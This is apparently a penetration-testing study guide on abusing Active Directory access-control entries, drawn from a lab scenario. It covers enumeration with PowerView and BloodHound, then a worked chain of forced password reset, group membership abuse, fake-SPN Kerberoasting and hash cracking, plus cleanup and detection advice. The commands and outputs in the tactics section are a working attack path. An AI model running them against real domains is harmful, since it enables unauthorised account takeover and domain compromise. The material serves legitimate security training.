# ACL Abuse in Active Directory

## Table of Contents
- [ACL Abuse Primer](#acl-abuse-primer)
- [ACL Enumeration](#acl-enumeration)
- [ACL Abuse Tactics](#acl-abuse-tactics)

---

## ACL Abuse Primer

- **ACL (Access Control List):** List of permissions on an AD object.
- **ACE (Access Control Entry):** Single permission entry in an ACL (who, what rights).
- **DACL:** Who can access/modify the object.
- **SACL:** What access attempts are audited.

**Why attackers care:**
- Misconfigured ACLs = stealthy privilege escalation, lateral movement, persistence.
- Abusable rights often go undetected by standard vulnerability scans.

**Key abusable rights:**
| Right/ACE         | What It Lets You Do                        | Example Tool/Command           |
|-------------------|--------------------------------------------|-------------------------------|
| GenericAll        | Full control over object                   | Set-DomainUserPassword        |
| GenericWrite      | Write to most attributes                   | Set-DomainObject              |
| WriteOwner        | Change object owner                        | Set-DomainObjectOwner         |
| WriteDACL         | Change permissions (add more rights)       | Add-DomainObjectACL           |
| ForceChangePassword | Reset user password (no old pwd needed)  | Set-DomainUserPassword        |
| AddMember         | Add users to groups                        | Add-DomainGroupMember         |
| AddSelf           | Add self to group (if allowed)             | Add-DomainGroupMember         |
| AllExtendedRights | Special/rare rights (reset pwd, etc.)      | Set-DomainUserPassword        |

**Typical attack flow:**
1. Enumerate ACLs (BloodHound, PowerView, ADExplorer)
2. Find abusable ACEs (see table above)
3. Exploit (abuse rights)
4. Escalate/move laterally

---

## ACL Enumeration

### PowerView (Targeted Enumeration)
- Get SID of your user:
  ```powershell
  $sid = ConvertTo-Sid wley
  ```
- Find objects your user can control:
  ```powershell
  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
  ```
  - Look for rights like `User-Force-Change-Password`, `GenericWrite`, `GenericAll`, `DS-Replication-Get-Changes`.
- Map GUIDs to readable names if needed:
  ```powershell
  $guid = "00299570-246d-11d0-a768-00aa006e0529"
  Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | ?{$_.rightsGuid -eq $guid} | fl Name,DisplayName
  ```
- Recursively enumerate: If you control user A, check what A controls, and so on.

### PowerShell (No PowerView)
- List all users:
  ```powershell
  Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
  ```
- For each user, check ACLs:
  ```powershell
  foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {
    get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}
  }
  ```

### BloodHound (Graphical, Fastest for Paths)
- Collect data with SharpHound, upload to BloodHound.
- Set your user as the start node, check "Outbound Control Rights" and "Transitive Object Control".
- Use pre-built queries: "Shortest Paths to High Value Targets", "Users with DCSync Rights", etc.
- Edge types to know: `ForceChangePassword`, `AddMember`, `GenericWrite`, `GenericAll`, `GetChangesAll`/`GetChanges`.

### Troubleshooting & OpSec
- Use `-Verbose` for feedback.
- Targeted enumeration is stealthier than querying everything.
- Monitor for Event ID 5136 (object modified), group membership changes, SPN modifications.

---

## ACL Abuse Tactics

Abusing ACLs in Active Directory is a powerful way to escalate privileges, move laterally, and ultimately compromise a domain. Below is a practical, stepwise example based on a real-world attack chain, with explanations and command outputs for each step. This is the kind of chain you might see in Hack The Box, CTFs, or real internal assessments.

### Scenario Recap
- **Initial foothold:** You control the user `wley` (NTLMv2 hash captured with Responder, cracked with Hashcat).
- **Goal:** Full domain compromise by obtaining DCSync rights (control of `adunn`).

### Step 1: Force Password Reset (wley → damundsen)
**Why:** If you have ForceChangePassword rights, you can reset another user's password without knowing the old one.
```powershell
$SecPassword = ConvertTo-SecureString 'wley_password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Import-Module .\PowerView.ps1
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
**Output:**
```
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```
- **Result:** You now control `damundsen`.

### Step 2: Group Membership Abuse (damundsen → Help Desk Level 1)
**Why:** If you have GenericWrite on a group, you can add users to it, inheriting all its rights (including nested groups).
```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```
**Output:**
```
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```
- **Result:** `damundsen` is now in Help Desk Level 1 group.

### Step 3: Nested Group Escalation (Help Desk Level 1 → Information Technology)
**Why:** Group nesting means rights are inherited. If Help Desk Level 1 is a member of Information Technology, so is `damundsen`.
- **Check group nesting:**
```powershell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```
- **Result:** You inherit all rights of Information Technology group.

### Step 4: Targeted Kerberoasting (adunn)
**Why:** If you have GenericAll on a user, you can set a fake SPN, Kerberoast, and crack their password offline.
- **Create a fake SPN:**
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```
**Output:**
```
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```
- **Kerberoast with Rubeus:**
```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```
**Output:**
```
[*] SamAccountName         : adunn
[*] ServicePrincipalName   : notahacker/LEGIT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL$...
```
- **Crack the hash offline with Hashcat:**
```bash
hashcat -m 13100 <hashfile> <wordlist>
```
- **Result:** You now have the cleartext password for `adunn` (DCSync rights).

### Step 5: Cleanup
**Why:** Always revert changes in labs/assessments to avoid detection and maintain integrity.
- **Remove fake SPN:**
```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
- **Remove user from group:**
```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
- **Reset damundsen password (if needed).**

### Detection & Remediation
- **Monitor for:**
  - Event ID 5136 (object modified)
  - Group membership changes
  - SPN modifications
- **Remediate:**
  - Audit and remove dangerous ACLs
  - Monitor high-value group memberships
  - Train staff to use BloodHound for regular reviews

---
**Pro Tips:**
- Always use `-Verbose` for feedback.
- Document every change for reporting.
- In real environments, get explicit approval before making changes.
- This chain is common in CTFs and real-world pentests—practice it in labs! 
